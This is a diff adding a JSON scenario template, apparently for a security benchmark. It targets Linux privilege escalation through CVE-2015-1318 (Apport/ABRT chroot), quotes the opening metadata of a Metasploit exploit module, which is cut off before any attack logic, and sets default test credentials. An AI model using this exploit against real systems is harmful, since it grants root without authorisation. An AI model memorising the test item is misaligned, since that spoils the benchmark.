@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_43971",
+  "category": "A4_polkit",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Apport/ABRT - 'chroot' Local Privilege Escalation (Metasploit) (CVE-2015-1318)\n\nExploit source code (43971.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apport / ABRT chroot Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems by\n        invoking the default coredump handler inside a namespace (\"container\").\n\n        Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are\n        vulnerable, due to a feature which allows forwarding reports to\n        a container's Apport by changing the root directory before loading\n        the crash report, causing 'usr/share/apport/apport' within the crashed\n        task's directory to be executed.\n\n        Similarly, Fedora is vulnerable when the kernel crash handler is\n        configured to change root directory before executing ABRT, causing\n        'usr/libexec/abrt-hook-ccpp' within the crashed task's directory to be\n        executed.\n\n        In both instances, the crash handler does not drop privileges,\n        resulting in code execution as root.\n\n        This module has been tested successfully on Apport 2.14.1 on\n        Ubuntu 14.04.1 LTS x86 and x86_64 and ABRT on Fedora 19 and 20 x86_64.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Stéphane Graber', # Independent discovery, PoC and patch\n          'Tavis Ormandy', # Independent discovery and C exploit\n          'Ricardo F. Teixeira', # shell exploit\n          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit\n        ],\n      'DisclosureDate' => 'Mar 31 2015',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'References'     =>\n        [\n          [ 'CVE', '2015-1318' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/14/4' ],\n          # Exploits\n          [ 'EDB', '36782' ],\n          [ 'EDB', '36746' ],\n          [ 'URL', 'https://gist.github.com/taviso/0f02c255c13c5c113406' ],\n          # ABRT (Fedora)\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211223' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211835' ],\n          # Apport (Ubuntu)\n          [ 'URL', 'https://usn.ubuntu.com/usn/USN-2569-1/' ],\n          [ 'URL', 'https://code.launchpad.net/~stgraber/apport/pidns-support/+merge/200893' ],\n          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1438758' ],\n          [ 'URL', 'http://bazaar.launchpad.net/~apport-hackers/apport/trunk/revision/2943' ]\n        ]\n    ))\n    register_options(\n      [\n        OptString.new('WritableDir', [ true, 'A directory where we can \n```",
+  "cve": "CVE-2015-1318",
+  "exploitdb_id": "43971",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_43971",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
